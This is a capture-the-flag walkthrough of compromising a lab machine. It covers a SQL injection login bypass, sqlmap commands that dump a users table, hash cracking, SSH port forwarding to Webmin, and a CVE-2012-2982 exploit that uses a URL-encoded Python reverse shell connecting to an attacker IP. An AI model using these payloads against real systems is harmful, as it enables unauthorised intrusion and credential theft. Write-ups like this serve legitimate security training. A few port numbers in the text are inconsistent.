> sql injection, ssh reverse tunneling,

# Ports

- **80** : Apache/2.4.18

### Port 80 is used for exploiting

# 80

1.  Contains a login field. sql injection `'OR 1=1;--` authenticates us.
2.  Logging in redirects us to portal.php, which contains a search bar.

# EXPLOITATION

We can try sql injection in the searchbar using `sqlmap`

Capture the request containing search string and save it using burpsuite.

## sqlmap

1.  `sqlmap -r req.txt --dbs` gives us the db name as "db"
2.  `sqlmap -r req.txt -D db --table`, gives us tables, the important one is "users"
3.  `sqlmap -r req.txt -D db -T users --dump`, gives us user "agent47" with a password hash

Cracking the hash with john the ripper `john --wordlist /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt --format=Raw-SHA256` gives the password as "videogamer124"

ssh using the credentials into the remote system.

# Actions in the low privilege shell

1.  The privilege escalation checklist for linux has been done. We find that the target uses 'webmin' when we ran `ps aux` and it comes up as `/usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf`
2.  Webmin documentation says it usually runs at localhost:10000 but we can't be access it using our web browser.
3.  We confirm that the port is open by running `netstat -ano` or alternatively `ss -tulpn`

We can use reverse ssh tunneling in such situations as the webmin port is not accessible from outside. ssh tunneling refers to the technique of forwarding the port from a remote server to a local host and their specified port.

4.  This is done in another terminal session of our attacking machine by running `ssh -L 10000:localhost:10000 agent47@10.10.138.200`
    - "ssh connect the **remote port 1000** to **the local port 10000** and ask for **service 'localhost'** of agent47@ip"
    
5.  We can now access the webmin portal from our browser by navigating to 'localhost:10000' and login using the same credentials for agent47.
    
6.  The webmin version is obtained from the html `<title` tag as 1.580. This version has an rce and an msf module is available. CVE-2012-2982
    
7.  msfmodule(`exploit/unix/webapp/webmin_show_cgi_exec`), or we can get the shell manually by crafting a reverse shell request to the browser.
    
8.  We can use the CVE information available [here](https://www.americaninfosec.com/research/dossiers/AISG-12-001.pdf), to craft a web request containing the **urlencoded** one-liner python reverse shell(`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.34.204,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`) .
    
9.  The url looks like this
    `http://localhost:9000/file/show.cgi/bin/echo|python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.18.34.204%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27|`
    

We are now root.